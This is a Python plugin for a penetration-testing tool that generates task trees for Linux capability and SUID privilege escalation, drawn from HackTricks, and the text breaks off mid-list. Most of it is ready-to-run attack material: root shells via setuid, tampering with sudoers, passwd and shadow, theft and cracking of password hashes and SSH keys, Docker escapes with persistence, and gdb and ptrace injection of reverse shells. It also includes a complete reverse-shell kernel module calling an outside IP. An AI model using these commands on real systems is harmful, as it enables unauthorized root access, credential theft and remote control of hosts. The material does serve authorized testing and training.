"""
Linux Capabilities & SUID/EUID privilege escalation plugin

Generates comprehensive tasks for Linux capability and SUID-based privilege escalation.
Covers all major capabilities including CAP_SYS_ADMIN, CAP_DAC_OVERRIDE, CAP_NET_RAW,
CAP_SYS_PTRACE, CAP_SYS_MODULE, and SUID/EUID exploitation vectors.

Extracted from HackTricks: linux-hardening/privilege-escalation/linux-capabilities.md
                          linux-hardening/privilege-escalation/euid-ruid-suid.md
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class LinuxCapabilitiesPlugin(ServicePlugin):
    """Linux capabilities and SUID privilege escalation plugin"""

    @property
    def name(self) -> str:
        return "linux-capabilities"

    @property
    def default_ports(self) -> List[int]:
        return []  # Not port-based, manually triggered

    @property
    def service_names(self) -> List[str]:
        return ['linux-capabilities', 'linux-caps', 'capabilities']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """This plugin is manually triggered for Linux privilege escalation"""
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Linux capabilities and SUID enumeration task tree"""

        tasks = {
            'id': 'linux-capabilities-enum',
            'name': 'Linux Capabilities & SUID Privilege Escalation',
            'type': 'parent',
            'children': []
        }

        # PHASE 1: Discovery & Enumeration
        tasks['children'].append(self._get_discovery_tasks())

        # PHASE 2: Capability-Specific Exploitation
        tasks['children'].append(self._get_capability_exploitation_tasks(target))

        # PHASE 3: SUID/EUID Exploitation
        tasks['children'].append(self._get_suid_exploitation_tasks())

        # PHASE 4: Docker/Container Escape
        tasks['children'].append(self._get_container_escape_tasks())

        return tasks

    def _get_discovery_tasks(self) -> Dict[str, Any]:
        """Discovery and enumeration phase"""
        return {
            'id': 'caps-discovery',
            'name': 'Phase 1: Discovery & Enumeration',
            'type': 'parent',
            'children': [
                {
                    'id': 'caps-scan-binaries',
                    'name': 'Scan for Binaries with Capabilities',
                    'type': 'command',
                    'metadata': {
                        'command': 'getcap -r / 2>/dev/null',
                        'description': 'Search entire filesystem for binaries with special capabilities',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'getcap': 'Get file capabilities - shows special privileges assigned to binaries',
                            '-r': 'Recursive search through entire directory tree',
                            '/': 'Start from root directory (search whole filesystem)',
                            '2>/dev/null': 'Suppress permission denied errors for cleaner output'
                        },
                        'success_indicators': [
                            'Binaries found with =ep or +ep capabilities',
                            'Python/perl/ruby with cap_setuid or cap_dac_override',
                            'Custom binaries with elevated capabilities'
                        ],
                        'failure_indicators': [
                            'No output (no capabilities set)',
                            'Only standard binaries like ping with cap_net_raw',
                            'Permission denied on all paths'
                        ],
                        'next_steps': [
                            'Check each capability against GTFOBins: https://gtfobins.github.io/',
                            'Focus on interpreters (python, perl, ruby) with caps',
                            'Look for custom/unusual binaries with capabilities'
                        ],
                        'alternatives': [
                            'find / -type f -executable -exec getcap {} \\; 2>/dev/null',
                            'Manual: Check common interpreter paths: getcap /usr/bin/python* /usr/bin/perl /usr/bin/ruby',
                            'capsh --print (shows current process capabilities)'
                        ],
                        'notes': 'Focus on CAP_SETUID, CAP_DAC_OVERRIDE, CAP_SYS_ADMIN, CAP_SYS_PTRACE for quick wins',
                        'estimated_time': '2-5 minutes'
                    }
                },
                {
                    'id': 'caps-check-current-process',
                    'name': 'Check Current Process Capabilities',
                    'type': 'command',
                    'metadata': {
                        'command': 'capsh --print',
                        'description': 'Display capabilities of current shell process',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'capsh': 'Capability shell - displays and manipulates process capabilities',
                            '--print': 'Print current capability sets (Effective, Permitted, Bounding, Ambient)'
                        },
                        'success_indicators': [
                            'Current: shows elevated capabilities beyond standard user',
                            'Bounding set includes CAP_SYS_ADMIN or CAP_SYS_PTRACE',
                            'Permitted set contains exploitable capabilities'
                        ],
                        'failure_indicators': [
                            'All capability sets empty or only basic caps',
                            'Running as unprivileged user with no special caps'
                        ],
                        'next_steps': [
                            'If elevated caps present, check for container escape opportunities',
                            'Decode hex values: capsh --decode=0x<hex>',
                            'Check /proc/$$/status | grep Cap for detailed view'
                        ],
                        'alternatives': [
                            'cat /proc/$$/status | grep Cap',
                            'cat /proc/self/status | grep Cap',
                            'getpcaps $$ (shows caps of current process)'
                        ],
                        'notes': 'Docker containers often have elevated capabilities by default',
                        'estimated_time': '30 seconds'
                    }
                },
                {
                    'id': 'caps-decode-hex',
                    'name': 'Decode Capability Hex Values',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Convert hex capability masks to capability names',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': [
                            'Example: capsh --decode=0x0000003fffffffff',
                            'Capability sets are stored as hex bitmasks',
                            'Each bit represents a capability (0-37)',
                            '',
                            'Common hex values:',
                            '0x0000003fffffffff = all capabilities (root)',
                            '0x0000000000003000 = cap_net_admin,cap_net_raw',
                            '0x00000000a80425fb = Docker default capabilities',
                            '',
                            'Alternative: use /usr/include/linux/capability.h to decode manually'
                        ],
                        'alternatives': [
                            'capsh --decode=<hex_value>',
                            'python -c "import struct; print(bin(0x<hex>))" (see bit positions)',
                            'cat /usr/include/linux/capability.h (capability definitions)'
                        ],
                        'estimated_time': '1 minute'
                    }
                },
                {
                    'id': 'caps-find-suid',
                    'name': 'Find SUID Binaries',
                    'type': 'command',
                    'metadata': {
                        'command': 'find / -perm -u=s -type f 2>/dev/null',
                        'description': 'Find all SUID binaries (may lead to privilege escalation)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'flag_explanations': {
                            'find': 'Search filesystem for files matching criteria',
                            '-perm -u=s': 'Find files with SUID bit set (runs as file owner)',
                            '-type f': 'Only match regular files (not directories)',
                            '2>/dev/null': 'Suppress permission denied errors'
                        },
                        'success_indicators': [
                            'Unusual SUID binaries found (not system defaults)',
                            'Custom binaries owned by root with SUID',
                            'Interpreters (python, perl) with SUID bit'
                        ],
                        'failure_indicators': [
                            'Only standard system binaries (passwd, su, sudo)',
                            'No custom/exploitable SUID binaries'
                        ],
                        'next_steps': [
                            'Check each binary against GTFOBins',
                            'Test custom SUID binaries for command injection',
                            'Look for SUID binaries calling system() or execve()'
                        ],
                        'alternatives': [
                            'find / -perm -4000 -type f 2>/dev/null',
                            'find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null',
                            'Manual: ls -la /usr/bin /usr/sbin /usr/local/bin | grep "^...s"'
                        ],
                        'notes': 'Cross-reference findings with https://gtfobins.github.io/',
                        'estimated_time': '3-5 minutes'
                    }
                },
                {
                    'id': 'caps-check-empty-caps',
                    'name': 'Find Binaries with Empty Capabilities',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Find non-SUID, non-root binaries with empty capability sets (=ep) - run as root!',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': [
                            'Special case: binary with empty capabilities (=ep) runs as root if:',
                            '1. Binary NOT owned by root',
                            '2. NO SUID/SGID bits set',
                            '3. Has empty capabilities: getcap binary shows "=ep"',
                            '',
                            'Example:',
                            '$ getcap myelf',
                            'myelf =ep',
                            '$ ls -l myelf',
                            '-rwxr-xr-x 1 user user 12345 Jan 1 myelf',
                            '$ ./myelf',
                            '# (runs as root despite no SUID)',
                            '',
                            'Search command:',
                            'getcap -r / 2>/dev/null | grep "=ep" | while read line; do',
                            '  file=$(echo $line | cut -d" " -f1)',
                            '  ls -l "$file" | grep -v "^....s" | grep -v "root root"',
                            'done',
                            '',
                            'Reference: https://man7.org/linux/man-pages/man7/capabilities.7.html'
                        ],
                        'alternatives': [
                            'Manual review of getcap output for =ep entries',
                            'Check ownership with: ls -l <binary_with_ep>'
                        ],
                        'estimated_time': '5 minutes'
                    }
                }
            ]
        }

    def _get_capability_exploitation_tasks(self, target: str) -> Dict[str, Any]:
        """Capability-specific exploitation techniques"""
        return {
            'id': 'caps-exploitation',
            'name': 'Phase 2: Capability-Specific Exploitation',
            'type': 'parent',
            'children': [
                # CAP_SETUID
                {
                    'id': 'cap-setuid-exploit',
                    'name': 'CAP_SETUID Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'cap-setuid-python',
                            'name': 'CAP_SETUID: Python Privilege Escalation',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Escalate to root using Python with CAP_SETUID capability',
                                'tags': ['EXPLOIT', 'OSCP:HIGH'],
                                'notes': [
                                    'If python has cap_setuid+ep capability, escalate to root:',
                                    '',
                                    'Method 1: Direct setuid(0)',
                                    r'python -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
                                    '',
                                    'Method 2: With prctl module',
                                    'import os',
                                    'import prctl',
                                    'prctl.cap_effective.setuid = True',
                                    'os.setuid(0)',
                                    'os.system("/bin/bash")',
                                    '',
                                    'Verify escalation:',
                                    '# id',
                                    'uid=0(root) gid=1000(user) groups=1000(user)',
                                    '',
                                    'Note: CAP_SETUID allows setting effective UID to any value'
                                ],
                                'alternatives': [
                                    r'Perl: perl -e \'use POSIX; POSIX::setuid(0); system("/bin/bash")\'',
                                    r'Ruby: ruby -e \'Process::Sys.setuid(0); system("/bin/bash")\'',
                                    r'Execute via binary: echo "import os; os.setuid(0); os.system(\'/bin/bash\')" > /tmp/root.py && python /tmp/root.py'
                                ],
                                'estimated_time': '2 minutes'
                            }
                        }
                    ]
                },
                # CAP_SETGID
                {
                    'id': 'cap-setgid-exploit',
                    'name': 'CAP_SETGID Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'cap-setgid-group-impersonate',
                            'name': 'CAP_SETGID: Group Impersonation',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Impersonate sensitive groups (shadow, docker, disk) for privilege escalation',
                                'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                                'notes': [
                                    'CAP_SETGID allows changing effective group ID',
                                    '',
                                    'Step 1: Find interesting groups',
                                    'cat /etc/group | grep -E "^(shadow|docker|disk|adm):"',
                                    'shadow:x:42:',
                                    'docker:x:999:',
                                    'disk:x:6:',
                                    '',
                                    'Step 2: Find group-readable sensitive files',
                                    'find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \\; 2>/dev/null',
                                    'find / -group docker -exec ls -lLd {} \\; 2>/dev/null',
                                    '',
                                    'Step 3: Impersonate group with Python',
                                    'import os',
                                    'os.setgid(42)  # shadow group',
                                    'os.system("/bin/bash")',
                                    '',
                                    'Step 4: Read sensitive files',
                                    'cat /etc/shadow  # Now readable!',
                                    '',
                                    'Docker group exploitation:',
                                    'os.setgid(999)  # docker group',
                                    'docker run -v /:/hostfs -it ubuntu chroot /hostfs /bin/bash'
                                ],
                                'alternatives': [
                                    'Find writable files: find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \\;',
                                    'Disk group: dd if=/dev/sda of=/tmp/disk.img bs=1M count=100 (read raw disk)',
                                    'Manual: Check which groups have access to /var/run/docker.sock'
                                ],
                                'estimated_time': '10 minutes'
                            }
                        }
                    ]
                },
                # CAP_DAC_OVERRIDE
                {
                    'id': 'cap-dac-override-exploit',
                    'name': 'CAP_DAC_OVERRIDE Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'cap-dac-override-write',
                            'name': 'CAP_DAC_OVERRIDE: Bypass Write Permissions',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Write to any file (shadow, sudoers, passwd) for privilege escalation',
                                'tags': ['EXPLOIT', 'OSCP:HIGH'],
                                'notes': [
                                    'CAP_DAC_OVERRIDE bypasses all read/write/execute permission checks',
                                    '',
                                    'Target files for privilege escalation:',
                                    '1. /etc/sudoers - Grant sudo access',
                                    '2. /etc/shadow - Change root password',
                                    '3. /etc/passwd - Add new root user',
                                    '4. ~/.ssh/authorized_keys (root) - Add SSH key',
                                    '',
                                    'Method 1: Add user to sudoers (Python)',
                                    'file = open("/etc/sudoers", "a")',
                                    'file.write("\\nyouruser ALL=(ALL) NOPASSWD:ALL\\n")',
                                    'file.close()',
                                    '',
                                    'Method 2: Modify /etc/shadow',
                                    '# Generate password hash',
                                    'openssl passwd -1 -salt abc password123',
                                    '$1$abc$...',
                                    '',
                                    '# Replace root password in shadow',
                                    'import fileinput',
                                    'for line in fileinput.input("/etc/shadow", inplace=True):',
                                    '    if line.startswith("root:"):',
                                    '        print("root:$1$abc$...:18000:0:99999:7:::")',
                                    '    else:',
                                    '        print(line, end="")',
                                    '',
                                    '# Now su to root with "password123"',
                                    'su root',
                                    '',
                                    'Method 3: Add new root user to /etc/passwd',
                                    'echo "rootuser:x:0:0::/root:/bin/bash" >> /etc/passwd',
                                    'passwd rootuser',
                                    'su rootuser'
                                ],
                                'alternatives': [
                                    'vim /etc/sudoers (if vim has cap_dac_override)',
                                    'echo "youruser ALL=(ALL) NOPASSWD:ALL" | tee -a /etc/sudoers',
                                    'Perl: open(F,">>/etc/sudoers"); print F "user ALL=(ALL) NOPASSWD:ALL\\n"; close(F);',
                                    'Ruby: File.open("/etc/sudoers","a") {|f| f.puts "user ALL=(ALL) NOPASSWD:ALL"}'
                                ],
                                'estimated_time': '5 minutes'
                            }
                        }
                    ]
                },
                # CAP_DAC_READ_SEARCH
                {
                    'id': 'cap-dac-read-exploit',
                    'name': 'CAP_DAC_READ_SEARCH Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'cap-dac-read-shadow',
                            'name': 'CAP_DAC_READ_SEARCH: Read Sensitive Files',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Bypass read permission checks to access /etc/shadow and other protected files',
                                'tags': ['EXPLOIT', 'OSCP:HIGH', 'QUICK_WIN'],
                                'notes': [
                                    'CAP_DAC_READ_SEARCH bypasses file read and directory traverse permissions',
                                    '',
                                    'Method 1: Read /etc/shadow with Python',
                                    'print(open("/etc/shadow", "r").read())',
                                    '',
                                    r'Method 2: Enumerate root\'s files',
                                    'import os',
                                    r'for r, d, f in os.walk(\'/root\'):',
                                    '    for filename in f:',
                                    '        print(os.path.join(r, filename))',
                                    '',
                                    'Method 3: Compress and extract with tar',
                                    'cd /etc',
                                    'tar -czf /tmp/shadow.tar.gz shadow',
                                    'cd /tmp',
                                    'tar -xzf shadow.tar.gz',
                                    'cat shadow',
                                    '',
                                    'Crack extracted password hashes:',
                                    'john --wordlist=/usr/share/wordlists/rockyou.txt shadow',
                                    'hashcat -m 1800 shadow /usr/share/wordlists/rockyou.txt',
                                    '',
                                    'Look for SSH keys:',
                                    'find /root -name id_rsa -o -name id_ed25519 2>/dev/null',
                                    'cat /root/.ssh/id_rsa'
                                ],
                                'alternatives': [
                                    'dd if=/etc/shadow of=/tmp/shadow',
                                    'cat /etc/shadow (if cat has capability)',
                                    'Manual: Open files in text editor with capability'
                                ],
                                'estimated_time': '5 minutes'
                            }
                        },
                        {
                            'id': 'cap-dac-read-docker-escape',
                            'name': 'CAP_DAC_READ_SEARCH: Docker Escape (Shocker Exploit)',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Escape Docker container using open_by_handle_at() to read host files',
                                'tags': ['EXPLOIT', 'OSCP:MEDIUM', 'CONTAINER_ESCAPE'],
                                'notes': [
                                    'CAP_DAC_READ_SEARCH enables open_by_handle_at(2) syscall abuse',
                                    'Original exploit: http://stealth.openwall.net/xSports/shocker.c',
                                    '',
                                    'Compile Shocker exploit (inside container):',
                                    'gcc shocker.c -o shocker',
                                    '',
                                    'Read host file:',
                                    './shocker /etc/shadow shadow_output',
                                    '',
                                    'Exploit flow:',
                                    '1. Open /etc/hostname (mounted from host)',
                                    '2. Use file handle to traverse to root filesystem',
                                    '3. Brute-force inode numbers to find target file',
                                    '4. Use open_by_handle_at() to open host file',
                                    '5. Read file contents',
                                    '',
                                    'Note: Exploit is slow (brute-forces 32-bit inode space)',
                                    'Expected time: 10-60 minutes depending on filesystem',
                                    '',
                                    'Reference: https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3'
                                ],
                                'alternatives': [
                                    'Modified shocker for specific files',
                                    'Manual: Find inode with debugfs, craft file handle manually'
                                ],
                                'estimated_time': '30-60 minutes (brute-force)'
                            }
                        }
                    ]
                },
                # CAP_CHOWN
                {
                    'id': 'cap-chown-exploit',
                    'name': 'CAP_CHOWN Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Change ownership of sensitive files (shadow, sudoers) then modify them',
                        'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                        'notes': [
                            'CAP_CHOWN allows changing ownership of any file',
                            '',
                            'Python exploitation:',
                            'import os',
                            '# Change shadow ownership to current user',
                            'os.chown("/etc/shadow", 1000, 1000)  # UID 1000 = your user',
                            '',
                            '# Now edit shadow file',
                            '# Generate password hash',
                            'import subprocess',
                            'hash = subprocess.check_output(["openssl", "passwd", "-1", "password123"])',
                            '',
                            '# Modify root password',
                            'with open("/etc/shadow", "r") as f:',
                            '    lines = f.readlines()',
                            'with open("/etc/shadow", "w") as f:',
                            '    for line in lines:',
                            '        if line.startswith("root:"):',
                            '            f.write(f"root:{hash.decode().strip()}:18000:0:99999:7:::\\n")',
                            '        else:',
                            '            f.write(line)',
                            '',
                            'Ruby alternative:',
                            'require "fileutils"',
                            'FileUtils.chown(1000, 1000, "/etc/shadow")'
                        ],
                        'alternatives': [
                            'Change sudoers ownership then add NOPASSWD entry',
                            'Change SSH authorized_keys ownership then add your key'
                        ],
                        'estimated_time': '5 minutes'
                    }
                },
                # CAP_FOWNER
                {
                    'id': 'cap-fowner-exploit',
                    'name': 'CAP_FOWNER Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Change permissions of any file to make it writable',
                        'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                        'notes': [
                            'CAP_FOWNER bypasses permission checks for chmod, chown operations',
                            '',
                            'Python exploitation:',
                            'import os',
                            '# Make shadow file writable',
                            'os.chmod("/etc/shadow", 0o666)',
                            '',
                            '# Now edit it',
                            'with open("/etc/shadow", "a") as f:',
                            '    # Generate hash: openssl passwd -1 password123',
                            '    f.write("newroot::0:0::/root:/bin/bash\\n")',
                            '',
                            '# Set password',
                            'import subprocess',
                            'subprocess.call(["passwd", "newroot"])',
                            '',
                            '# Escalate',
                            'su newroot'
                        ],
                        'alternatives': [
                            'chmod 777 /etc/sudoers && echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
                            'chmod 777 /etc/passwd && add root user',
                            'chmod 600 /root/.ssh/authorized_keys && add SSH key'
                        ],
                        'estimated_time': '5 minutes'
                    }
                },
                # CAP_SETFCAP
                {
                    'id': 'cap-setfcap-exploit',
                    'name': 'CAP_SETFCAP Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Set capabilities on other binaries to enable further exploitation',
                        'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                        'notes': [
                            'CAP_SETFCAP allows setting capabilities on files',
                            '',
                            'Python exploitation:',
                            'import ctypes',
                            'import sys',
                            '',
                            'libcap = ctypes.cdll.LoadLibrary("libcap.so.2")',
                            'libcap.cap_from_text.argtypes = [ctypes.c_char_p]',
                            'libcap.cap_from_text.restype = ctypes.c_void_p',
                            'libcap.cap_set_file.argtypes = [ctypes.c_char_p, ctypes.c_void_p]',
                            '',
                            '# Give python cap_setuid',
                            'cap = b"cap_setuid+ep"',
                            'path = b"/usr/bin/python3"',
                            'cap_t = libcap.cap_from_text(cap)',
                            'status = libcap.cap_set_file(path, cap_t)',
                            '',
                            'if status == 0:',
                            '    print("Success! Python now has cap_setuid")',
                            '',
                            '# Now use CAP_SETUID exploitation',
                            'import os',
                            'os.setuid(0)',
                            'os.system("/bin/bash")',
                            '',
                            'WARNING: Setting capabilities removes the original CAP_SETFCAP!',
                            'Chain: Set cap_setuid on another binary first as backup'
                        ],
                        'alternatives': [
                            'setcap cap_setuid+ep /bin/bash (if setcap binary available)',
                            'Give capabilities to multiple binaries before losing CAP_SETFCAP',
                            'Set empty capabilities (=ep) on non-root binary for root execution'
                        ],
                        'estimated_time': '10 minutes'
                    }
                },
                # CAP_SYS_ADMIN
                {
                    'id': 'cap-sys-admin-exploit',
                    'name': 'CAP_SYS_ADMIN Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'cap-sys-admin-mount',
                            'name': 'CAP_SYS_ADMIN: Mount Passwd Overlay',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Mount modified passwd file over /etc/passwd to add root user',
                                'tags': ['EXPLOIT', 'OSCP:HIGH'],
                                'notes': [
                                    'CAP_SYS_ADMIN allows mounting filesystems and many admin operations',
                                    '',
                                    'Method 1: Passwd overlay (Python)',
                                    '# Create fake passwd with your user as root',
                                    'cp /etc/passwd /tmp/passwd',
                                    'openssl passwd -1 -salt abc password123',
                                    '$1$abc$...',
                                    'echo "fakeroot:$1$abc$...:0:0::/root:/bin/bash" >> /tmp/passwd',
                                    '',
                                    '# Mount it over /etc/passwd',
                                    'from ctypes import *',
                                    'libc = CDLL("libc.so.6")',
                                    'libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)',
                                    'MS_BIND = 4096',
                                    'source = b"/tmp/passwd"',
                                    'target = b"/etc/passwd"',
                                    'filesystemtype = b"none"',
                                    'options = b"rw"',
                                    'libc.mount(source, target, filesystemtype, MS_BIND, options)',
                                    '',
                                    '# Escalate',
                                    'su fakeroot  # Password: password123',
                                    '',
                                    'Method 2: Shadow overlay',
                                    'Same process but mount over /etc/shadow instead'
                                ],
                                'alternatives': [
                                    'Mount custom sudoers file over /etc/sudoers',
                                    'Mount writable directory over /etc/cron.d',
                                    'Manual: Use mount command if available'
                                ],
                                'estimated_time': '10 minutes'
                            }
                        },
                        {
                            'id': 'cap-sys-admin-docker-escape',
                            'name': 'CAP_SYS_ADMIN: Docker Escape via Host Mount',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Mount host disk inside container and chroot to escape',
                                'tags': ['EXPLOIT', 'OSCP:HIGH', 'CONTAINER_ESCAPE'],
                                'notes': [
                                    'If inside Docker with CAP_SYS_ADMIN, mount host disk',
                                    '',
                                    'Step 1: List disk devices',
                                    'fdisk -l',
                                    'Disk /dev/sda: 20 GiB',
                                    '',
                                    'Step 2: Mount host root filesystem',
                                    'mkdir /mnt/host',
                                    'mount /dev/sda1 /mnt/host',
                                    '',
                                    'Step 3: Chroot to host',
                                    'chroot /mnt/host /bin/bash',
                                    '',
                                    'Step 4: Now on host filesystem!',
                                    '# Add SSH key for persistence',
                                    'mkdir -p /root/.ssh',
                                    'echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys',
                                    '',
                                    '# Or add user to sudoers',
                                    'echo "yourusr ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers',
                                    '',
                                    '# Find SSH port on host',
                                    'nc -v -n -w2 -z 172.17.0.1 1-65535',
                                    'ssh yourusr@172.17.0.1 -p 2222'
                                ],
                                'alternatives': [
                                    'If SSH not available: create cron job for reverse shell',
                                    'Modify /etc/shadow on mounted host filesystem',
                                    'Add new root user to host /etc/passwd'
                                ],
                                'estimated_time': '15 minutes'
                            }
                        }
                    ]
                },
                # CAP_SYS_PTRACE
                {
                    'id': 'cap-sys-ptrace-exploit',
                    'name': 'CAP_SYS_PTRACE Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'cap-sys-ptrace-inject',
                            'name': 'CAP_SYS_PTRACE: Shellcode Injection into Root Process',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Inject shellcode into root-owned process for privilege escalation',
                                'tags': ['EXPLOIT', 'OSCP:MEDIUM'],
                                'notes': [
                                    'CAP_SYS_PTRACE allows attaching to and controlling other processes',
                                    'Requires --pid=host in Docker or access to host processes',
                                    '',
                                    'Step 1: Find root process',
                                    'ps aux | grep root | head -20',
                                    'root      1234  0.0  0.1  12345  6789 ?  Ss  12:00  0:00 /usr/bin/daemon',
                                    '',
                                    'Step 2: Python process injection script',
                                    'import ctypes, sys, struct',
                                    'PTRACE_ATTACH = 16',
                                    'PTRACE_DETACH = 17',
                                    'PTRACE_POKETEXT = 4',
                                    'PTRACE_GETREGS = 12',
                                    'PTRACE_SETREGS = 13',
                                    '',
                                    'libc = ctypes.CDLL("libc.so.6")',
                                    'pid = int(sys.argv[1])',
                                    '',
                                    '# Attach to target process',
                                    'libc.ptrace(PTRACE_ATTACH, pid, None, None)',
                                    '',
                                    '# Inject reverse shell shellcode (x64)',
                                    r'shellcode = b"\x48\x31\xc0\x48\x31\xd2..." # msfvenom payload',
                                    '',
                                    '# Inject and execute (see full code in HackTricks)',
                                    '',
                                    'Step 3: Listen for reverse shell',
                                    'nc -lvnp 4444',
                                    '',
                                    'Alternative: gdb injection',
                                    'gdb -p <PID>',
                                    r'(gdb) call (void)system("bash -c \'bash -i >& /dev/tcp/YOURIP/4444 0>&1\'")',
                                    '(gdb) detach',
                                    '(gdb) quit'
                                ],
                                'alternatives': [
                                    'Inject shellcode with gdb: set {long}($rip) = 0x...',
                                    'Use existing shellcode injection tools',
                                    'Manual memory write with /proc/<pid>/mem'
                                ],
                                'estimated_time': '20 minutes'
                            }
                        },
                        {
                            'id': 'cap-sys-ptrace-gdb',
                            'name': 'CAP_SYS_PTRACE: GDB system() Call Injection',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Use gdb to make root process call system() with arbitrary command',
                                'tags': ['EXPLOIT', 'OSCP:HIGH', 'QUICK_WIN'],
                                'notes': [
                                    'If gdb installed and has CAP_SYS_PTRACE (or you do):',
                                    '',
                                    'Step 1: Find root process',
                                    'ps aux | grep root',
                                    '',
                                    'Step 2: Attach with gdb',
                                    'gdb -p 1234',
                                    '',
                                    'Step 3: Call system() to execute commands as root',
                                    '(gdb) call (void)system("id")',
                                    '(gdb) call (void)system("chmod +s /bin/bash")',
                                    r'(gdb) call (void)system("echo \'youruser ALL=(ALL) NOPASSWD:ALL\' >> /etc/sudoers")',
                                    r'(gdb) call (void)system("bash -c \'bash -i >& /dev/tcp/YOURIP/4444 0>&1\'")',
                                    '',
                                    'Step 4: Detach',
                                    '(gdb) detach',
                                    '(gdb) quit',
                                    '',
                                    'Alternative: Set SUID on bash',
                                    '(gdb) call (void)system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash")',
                                    '# Then: /tmp/rootbash -p'
                                ],
                                'alternatives': [
                                    'Inject shellcode if gdb unavailable',
                                    'Manual: Write to /proc/<pid>/mem',
                                    'Use strace to trace and modify syscalls'
                                ],
                                'estimated_time': '5 minutes'
                            }
                        }
                    ]
                },
                # CAP_SYS_MODULE
                {
                    'id': 'cap-sys-module-exploit',
                    'name': 'CAP_SYS_MODULE Exploitation',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'cap-sys-module-lkm',
                            'name': 'CAP_SYS_MODULE: Load Malicious Kernel Module',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Load kernel module for root reverse shell',
                                'tags': ['EXPLOIT', 'OSCP:MEDIUM', 'CONTAINER_ESCAPE'],
                                'notes': [
                                    'CAP_SYS_MODULE allows loading/unloading kernel modules',
                                    '',
                                    'Step 1: Create reverse shell kernel module (reverse-shell.c)',
                                    '#include <linux/kmod.h>',
                                    '#include <linux/module.h>',
                                    'MODULE_LICENSE("GPL");',
                                    '',
                                    'char* argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};',
                                    'static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL};',
                                    '',
                                    'static int __init reverse_shell_init(void) {',
                                    '    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);',
                                    '}',
                                    '',
                                    'static void __exit reverse_shell_exit(void) {',
                                    '    printk(KERN_INFO "Exiting\\n");',
                                    '}',
                                    '',
                                    'module_init(reverse_shell_init);',
                                    'module_exit(reverse_shell_exit);',
                                    '',
                                    'Step 2: Create Makefile (USE TABS NOT SPACES)',
                                    'obj-m +=reverse-shell.o',
                                    '',
                                    'all:',
                                    '    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules',
                                    '',
                                    'clean:',
                                    '    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean',
                                    '',
                                    'Step 3: Compile (requires kernel headers)',
                                    'make',
                                    '',
                                    'Step 4: Start listener',
                                    'nc -lvnp 4444',
                                    '',
                                    'Step 5: Load module',
                                    'insmod reverse-shell.ko',
                                    '',
                                    'Catch shell running as root!'
                                ],
                                'alternatives': [
                                    'Python module loading: import kmod; km = kmod.Kmod(); km.modprobe("reverse-shell")',
                                    'Use existing kernel rootkit modules',
                                    'Modify /etc/modprobe.d/ for persistence'
                                ],
                                'estimated_time': '20 minutes'
                            }
                        }
                    ]
                },
                # CAP_NET_RAW
                {
                    'id': 'cap-net-raw-exploit',
                    'name': 'CAP_NET_RAW Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Sniff network traffic for credentials (not direct privesc)',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'notes': [
                            'CAP_NET_RAW allows creating raw sockets for packet capture',
                            'Not direct privilege escalation but can capture credentials',
                            '',
                            'Method 1: tcpdump (if has capability)',
                            'tcpdump -i any -w /tmp/capture.pcap',
                            '# Transfer to attacker machine',
                            '# Analyze with Wireshark for credentials',
                            '',
                            'Method 2: Python packet capture',
                            'import socket',
                            's = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))',
                            's.bind(("eth0", 0x0003))',
                            'while True:',
                            '    pkt = s.recv(4096)',
                            '    # Parse for HTTP Basic Auth, FTP, Telnet credentials',
                            '',
                            'Look for:',
                            '- HTTP Basic Auth (base64 in Authorization header)',
